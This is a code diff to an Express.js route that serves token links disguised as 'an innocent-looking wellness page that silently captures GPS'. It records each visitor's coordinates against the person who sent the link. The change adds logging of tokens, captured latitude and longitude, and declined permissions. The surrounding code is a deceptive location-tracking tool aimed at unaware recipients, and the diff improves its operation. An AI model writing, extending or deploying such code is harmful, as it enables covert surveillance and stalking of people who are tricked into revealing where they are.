@@ -10,10 +10,13 @@ router.get('/:token', (req, res) => {
 
   // If token is invalid or expired, show a simple 404-like page
   if (!data) {
+    console.log(`[GPS] Invalid or expired token accessed: ${token}`);
     return res.status(404).send(`<!DOCTYPE html><html><head><title>Page Not Found</title></head>
 <body style="font-family:sans-serif;text-align:center;padding:60px">
 <p>This link has expired or is not valid.</p></body></html>`);
   }
+  
+  console.log(`[GPS] Token ${token} accessed by user. Serving capture page.`);
 
   // Serve an innocent-looking wellness page that silently captures GPS
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
@@ -121,11 +124,17 @@ router.post('/:token', express.json(), (req, res) => {
   const { lat, lng } = req.body || {};
 
   const data = getTokenData(token);
-  if (!data) return res.status(410).json({ ok: false, reason: 'expired' });
+  if (!data) {
+    console.log(`[GPS] POST received for invalid/expired token: ${token}`);
+    return res.status(410).json({ ok: false, reason: 'expired' });
+  }
 
   if (lat != null && lng != null) {
+    console.log(`[GPS] Successfully captured coordinates for ${data.sender}: ${lat}, ${lng}`);
     storeCoords(token, lat, lng);
     storeLocationInSession(data.sender, lat, lng);
+  } else {
+    console.log(`[GPS] User ${data.sender} declined or failed to provide location permissions.`);
   }
   // Always invalidate — one use only
   invalidateToken(token);
